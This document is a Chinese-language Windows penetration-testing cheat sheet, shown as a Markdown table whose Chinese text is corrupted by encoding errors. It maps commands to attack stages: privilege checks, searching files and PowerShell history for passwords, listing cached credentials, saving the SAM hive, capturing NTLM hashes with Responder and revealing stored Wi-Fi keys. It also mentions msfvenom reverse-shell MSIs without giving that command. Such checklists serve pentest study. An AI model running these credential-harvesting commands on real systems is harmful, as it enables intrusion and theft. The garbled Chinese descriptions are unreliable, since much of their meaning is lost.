| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <p></p><ol><li><mark style="color:red;">åˆå§‹å­˜å–ï¼ˆExploit æ¼æ´æ‰“é€²æ©Ÿå™¨ï¼‰</mark></li></ol>                                  |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `systeminfo`                                                                                                   |                                                                                                                                                                                                                                                                                                                                |                                                               | [#windows-kernel-exploits-nei-he-lou-dong-ti-quan](windows-quan-xian-ti-sheng.md#windows-kernel-exploits-nei-he-lou-dong-ti-quan "mention")                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `wmic product get name`                                                                                        | æƒææ‡‰ç”¨ç¨‹å¼æ˜¯å¦å­˜åœ¨å¼±é»ï¼ˆå¦‚ Java 6ã€Flashã€è€ç‰ˆ 7-Zipã€TeamViewerï¼‰                                                                                                                                                                                                                                                                               | æ˜¯                                                             | æŸ¥ CVEï¼Œæº–å‚™ç‰¹å®š Exploit æˆ–åˆ©ç”¨ DLL Hijacking                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ä½¿ç”¨ msfvenom ç”Ÿæˆæƒ¡æ„ MSI ä¸¦å»ºç«‹åå‘é€£ç·š                                                                                   |                                                                                                                                                                                                                                                                                                                                |                                                               | [#zhong-du-gong-ji-sheng-chengeyi-msi-bing-jian-li-fan-xiang-lian-xian](windows-quan-xian-ti-sheng.md#zhong-du-gong-ji-sheng-chengeyi-msi-bing-jian-li-fan-xiang-lian-xian "mention")                                                                                                                                                                                                                                                                                                                                                                                   |
| <p></p><ol start="2"><li><mark style="color:red;">æ¬Šé™æå‡ï¼ˆæå‡ç‚º SYSTEM / Administratorï¼‰</mark></li></ol>            |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `whoami /priv`                                                                                                 | <mark style="color:red;">SeImpersonate</mark> / <mark style="color:red;">SeAssignPrimaryToken</mark> / <mark style="color:red;">SeDebugPrivilege</mark> /  <mark style="color:red;">SeTakeOwnershipPrivilege</mark> /<mark style="color:red;">SeBackupPrivilege</mark> /<mark style="color:red;">SeLoadDriverPrivilege</mark>  | å­˜åœ¨                                                            | [#seimpersonate-and-seassignprimarytoken-gong-ji](windows-quan-xian-ti-sheng.md#seimpersonate-and-seassignprimarytoken-gong-ji "mention")[#sedebugprivilege-quan-xian-ti-quan-gong-ji](windows-quan-xian-ti-sheng.md#sedebugprivilege-quan-xian-ti-quan-gong-ji "mention")[#setakeownership-quan-xian-lan-yong-gong-ji](windows-quan-xian-ti-sheng.md#setakeownership-quan-xian-lan-yong-gong-ji "mention")  [#print-operators-lie-yin-cao-zuo-yuan-quan-xian-li-yong](windows-quan-xian-ti-sheng.md#print-operators-lie-yin-cao-zuo-yuan-quan-xian-li-yong "mention")/ |
| `net local "Event Log Readers"`                                                                                | é¡¯ç¤ºè‡ªå·±çš„åå­—                                                                                                                                                                                                                                                                                                                        |                                                               | [#event-log-readers-quan-xian-lan-yong-min-gan-ming-ling-xing-xie-qu-gong-ji](windows-quan-xian-ti-sheng.md#event-log-readers-quan-xian-lan-yong-min-gan-ming-ling-xing-xie-qu-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ADGroupMember -Identity DnsAdmins`                                                                        | é¡¯ç¤ºè‡ªå·±çš„åå­—                                                                                                                                                                                                                                                                                                                        |                                                               | [#dnsadmins-quan-xian-lan-yong-gong-ji](windows-quan-xian-ti-sheng.md#dnsadmins-quan-xian-lan-yong-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `Get-LocalGroupMember -Group "Hyper-V Administrators"`                                                         | é¡¯ç¤ºè‡ªå·±çš„åå­—                                                                                                                                                                                                                                                                                                                        |                                                               | [#hyperv-administrators-quan-xian-li-yong](windows-quan-xian-ti-sheng.md#hyperv-administrators-quan-xian-li-yong "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`          | <p><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</code><br></p>                                                                                                                                                                                   | <p>å¦‚æœæ˜¯ <code>0x2</code> æˆ– <code>0x0</code>ï¼Œæ­å–œï¼Œéå¸¸å®¹æ˜“åˆ©ç”¨ï¼<br></p> | [#user-account-controluac-rao-guo](windows-quan-xian-ti-sheng.md#user-account-controluac-rao-guo "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `.\SharpUp.exe audit`                                                                                          | æ‰¾ `Modifiable Service Binaries`ã€`Modifiable Services` æˆ– `Modifiable Registry Keys`                                                                                                                                                                                                                                             | æ˜¯                                                             | [#ruo-quan-xian-ti-quan-gong-ji](windows-quan-xian-ti-sheng.md#ruo-quan-xian-ti-quan-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| <p></p><ol start="3"><li><mark style="color:red;">æ†‘è­‰æ“·å–ï¼ˆDump SAMã€LSASSã€Security Hive ç­‰ï¼‰</mark></li></ol>        |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `net user`                                                                                                     | æª¢æŸ¥æœ¬åœ°å¸³æˆ¶æ‰€å±¬ç¾¤çµ„ï¼Œå¦‚ Administratorsã€æ˜¯å¦å·²å•Ÿç”¨ã€ä¸Šæ¬¡ç™»å…¥æ™‚é–“                                                                                                                                                                                                                                                                                       | å­˜åœ¨                                                            | æ¸¬è©¦æœ¬åœ°æˆ–é ç«¯ç™»å…¥ï¼Œæ”¶é›†æ´»å‹•ç”¨æˆ¶è³‡è¨Š                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `net localgroup`                                                                                               | ç¾¤çµ„ä¸­æ˜¯å¦å‡ºç¾å…¶ä»–ä½¿ç”¨è€…ï¼ˆå¦‚å…¶ä»–ç¶²åŸŸä½¿ç”¨è€…ï¼‰æˆ–æœå‹™å¸³æˆ¶ -> æç¤ºæ½›åœ¨æ©«å‘ç›®æ¨™                                                                                                                                                                                                                                                                                        | å­˜åœ¨                                                            | æ¸¬è©¦æœ¬åœ°æˆ–é ç«¯ç™»å…¥ï¼Œè¾¨è­˜å¯èƒ½é€šç”¨æ†‘è­‰                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `net localgroup "Event Log Readers"`                                                                           | æœ‰å¸³è™Ÿå­˜åœ¨ -> å¯ç„¡éœ€ææ¬ŠæŸ¥çœ‹å®‰å…¨æ—¥èªŒï¼Œä¾‹å¦‚ç™»å…¥äº‹ä»¶4624                                                                                                                                                                                                                                                                                                | æ˜¯                                                             | å˜—è©¦è®€å–å®‰å…¨æ—¥èªŒï¼Œè§€å¯Ÿé«˜æ¬Šé™å¸³è™Ÿæ´»å‹•æˆ–ç™»å…¥ä¾†æº                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`                                                  | å¿«é€Ÿæœå°‹æ•æ„Ÿæª”æ¡ˆï¼Œé‡å° config è¨­å®šã€å¯†ç¢¼å‚™è¨»ç­‰                                                                                                                                                                                                                                                                                                    | æœ‰å¯†ç¢¼é—œéµå­—                                                        | å˜—è©¦ç™»å…¥ SMBã€RDPã€ADã€VPN ç­‰å¤–éƒ¨è³‡æº                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `gc 'C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'`                 | ä½¿ç”¨è€…è‡ªè¨‚è©å…¸ï¼Œå¸¸ç”¨æ–¼è‡ªå®šç¾©æ‹¼å­—ï¼Œå¯ç‚ºå¯†ç¢¼å­—å…¸ä¾†æº                                                                                                                                                                                                                                                                                                      | æœ‰è©å½™                                                           | æ“´å……å­—å…¸é€²è¡Œæš´åŠ›ç ´è§£æˆ–ç¤¾å·¥å£ä»¤çµ„åˆ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,unattend.xml.bak -ErrorAction SilentlyContinue`        | æœå°‹ç³»çµ±è‡ªå‹•åŒ–éƒ¨ç½²æª”ï¼Œå¸¸è¦‹æ–¼ AD join æˆ–æœ¬åœ°å¸³è™Ÿé…ç½®                                                                                                                                                                                                                                                                                                 | æœ‰æª”æ¡ˆ                                                           | è§£ææ˜æ–‡å¸³å¯†ï¼ŒåŸ·è¡Œæœ¬åœ°æˆ–æ©«å‘ç™»å…¥                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `gc (Get-PSReadLineOption).HistorySavePath`                                                                    | PowerShell ä½¿ç”¨æ­·å²ï¼Œæœƒç•™æœ‰æ†‘è­‰ã€å‘½ä»¤ã€IP ç­‰è¡Œç‚ºç—•è·¡                                                                                                                                                                                                                                                                                              | æœ‰æ•æ„Ÿå…§å®¹                                                         | é‡è¤‡åˆ©ç”¨å‘½ä»¤ã€æ†‘è­‰ã€æœå‹™æŒ‡ä»¤æ§‹å»º lateral pivoting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `findstr /SI /M "password" *.txt *.ini *.cfg *.config *.xml`                                                   | å¤šé»ä½æƒæç”¨æˆ¶æ–‡ä»¶å¤¾èˆ‡å‚™ä»½                                                                                                                                                                                                                                                                                                                  | æœ‰å…§å®¹                                                           | å˜—è©¦ç™»å…¥å…¶ä»–æœå‹™æˆ–é›²ç«¯è³‡æº                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `Select-String -Path C:\Users\*\Documents\*.txt -Pattern "password"`                                           | ç²¾æº–æœå°‹ Documents å…§éƒ¨æª”æ¡ˆï¼Œæœ‰è¼ƒé«˜å‘½ä¸­ç‡                                                                                                                                                                                                                                                                                                     | æœ‰ç™¼ç¾                                                           | åšæ†‘è­‰çˆ†ç ´æˆ–æ©«å‘ç§»å‹•æ¸¬è©¦                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `%SYSTEMDRIVE%\pagefile.sys`                                                                                   | äº¤æ›è¨˜æ†¶é«”æª”æ¡ˆï¼Œå¯èƒ½ä¿æœ‰æ­·å²å¯†ç¢¼ã€æ˜æ–‡è³‡è¨Š                                                                                                                                                                                                                                                                                                          | å¯å–å¾—                                                           | ç”¨ volatility åˆ†æè¨˜æ†¶é«”ï¼Œæ‰¾å¸³å¯†æˆ– hashã€token ç­‰æ•æ„Ÿè³‡è¨Š                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| `cmdkey /list`                                                                                                 | Windows å„²å­˜çš„æ†‘è­‰å¿«å–ï¼Œå¯ä¾› runas èª¿ç”¨                                                                                                                                                                                                                                                                                                    | æœ‰æ†‘è­‰ç´€éŒ„                                                         | ä½¿ç”¨ `runas /savecred` é‡è¤‡ç™»å…¥ï¼Œéœé»˜ä½¿ç”¨æ†‘è­‰æ”»æ“Š                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `%WINDIR%\debug\NetSetup.log`                                                                                  | Windows AD åŠ å…¥è¨˜éŒ„ï¼Œå¯èƒ½å«å¸³è™Ÿæˆ–å»ºç«‹è€…è³‡è¨Š                                                                                                                                                                                                                                                                                                    | å¯è¦‹                                                            | æ¨ä¼° AD ç®¡ç†è€…è¡Œç‚ºã€æ‰¾é€šç”¨æ†‘è­‰ç·šç´¢                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `%WINDIR%\system32\config\security.sav`                                                                        | å‚™ä»½ç™»éŒ„æª”ï¼Œå«å®‰å…¨æ€§ç­–ç•¥èˆ‡æ¬Šé™è³‡è¨Š                                                                                                                                                                                                                                                                                                              | å¯å–å¾—                                                           | åšé›¢ç·š Registry åˆ†æï¼Œæ‰¾ SID / ACL æˆ–æ¬Šé™è¨­å®š                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| <p></p><ol start="4"><li><mark style="color:red;">å¯†ç¢¼ç ´è§£ï¼ˆHashcat / John ç­‰é›¢ç·šæ”»æ“Šï¼‰</mark></li></ol>                  |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `C:\ProgramData\Configs*`                                                                                      | å¸¸ç”¨ç‚ºè‡ªè¨‚è»Ÿé«”çš„å„²å­˜ä½ç½®ï¼Œå«æ˜æ–‡å¸³å¯†æˆ– token                                                                                                                                                                                                                                                                                                      | æœ‰è¨­å®šæª”                                                          | å°‹æ‰¾å¸³å¯†è¨­å®šæˆ–å‚™ä»½ï¼Œæ©«å‘æ”»æ“Šæ–°ç›®æ¨™                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `sudo responder -wrf -v -I tun0`                                                                               | æ•ç² NTLM Hashï¼šå¦‚ SMB Relayã€WPADã€HTTP åŸºæ–¼ LAN æ””æˆª                                                                                                                                                                                                                                                                                   | å–å¾— hash                                                       | ä½¿ç”¨ hashcat / john ç ´è§£æˆ– pass-the-hash åˆ©ç”¨                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| `%USERPROFILE%\ntuser.dat`                                                                                     | ä½¿ç”¨è€…è¡Œç‚ºåˆ†æç™»éŒ„æª”ï¼Œå¯å«è‡ªå‹•ç™»å…¥å¸³å¯†ã€è‡ªå‹•å•Ÿå‹•é …ç­‰                                                                                                                                                                                                                                                                                                     | å¯å–                                                            | åˆ†æä½¿ç”¨è€…è¡Œç‚ºç´€éŒ„èˆ‡æ†‘è­‰ç—•è·¡ã€Persist æ§‹å»ºä¾æ“š                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| <p></p><ol start="5"><li><mark style="color:red;">ğŸ‘‰ã€æ©«å‘ç§»å‹•ã€‘ï¼šä½¿ç”¨æ“·å–çš„æ†‘è­‰å»ç™»å…¥åˆ¥çš„ä¸»æ©Ÿï¼ˆRDPã€SMBã€WMIã€Psexecï¼‰</mark></li></ol> |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| <p>å¦‚æœå¯ä»¥ä½¿ç”¨admin é–‹å•Ÿcmd.exe</p><p></p><p>reg save HKLM\SAM C:\sam.save </p>                                       | æˆåŠŸ                                                                                                                                                                                                                                                                                                                             |                                                               | SAM æ”»æ“Š                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| <p></p><ol start="6"><li><mark style="color:red;">æ©Ÿå¯†æå– / æ§åˆ¶æ¬Šå¥ªå– / æ”»æ“Šæ©«å‘æ“´å¼µ</mark></li></ol>                       |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `net use`                                                                                                      | åˆ—å‡ºç¶²è·¯ç£ç¢Ÿæ›è¼‰ã€æ†‘è­‰ç¶å®šã€AD ä½¿ç”¨ç´€éŒ„                                                                                                                                                                                                                                                                                                          | æœ‰ç£ç¢Ÿæ›è¼‰                                                         | æƒæå…±ç”¨è³‡æ–™å¤¾æ‰¾æ†‘è­‰ã€å…§éƒ¨è³‡æºèˆ‡ Payload æ”¾ç½®é»                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `netsh wlan show profile`                                                                                      | æª¢æŸ¥ç„¡ç·šç¶²è·¯æ¸…å–®                                                                                                                                                                                                                                                                                                                       | æœ‰ Wi-Fi è¨­å®šæª”                                                   | ä¸‹ä¸€æ­¥ä½¿ç”¨ key=clear å–å‡ºå¯†ç¢¼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| `netsh wlan show profile <ProfileName> key=clear`                                                              | é¡¯ç¤ºæ˜æ–‡ Wi-Fi å¯†ç¢¼                                                                                                                                                                                                                                                                                                                  | å¯†ç¢¼å‡ºç¾                                                          | é€²è¡Œç„¡ç·šç¶²è·¯æ»²é€ï¼ˆç„¡ç·šä¸­ç¹¼ã€å½ AP æ”»æ“Šï¼‰                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |

***

> ğŸ’¡æ­¤è¡¨æ ¼å¯é…åˆæ¯æ¬¡ä¸»æ©Ÿæ»²é€éç¨‹é€é …æ“ä½œï¼Œé€æ¢åˆ¤æ–·æ˜¯å¦èƒ½ææ¬Šã€è½‰å‘ã€ç²å–æ†‘è­‰æˆ–é€²è¡Œå¾Œé–€ç¶­æŒã€‚ è‹¥éœ€åŒ¯å‡º PDFã€Markdownã€æˆ–è½‰æˆå¯åŸ·è¡Œè…³æœ¬ï¼ˆå¦‚ AutoRecon æ¨¡çµ„ï¼‰ï¼Œå¯é€²ä¸€æ­¥å‘ŠçŸ¥ã€‚
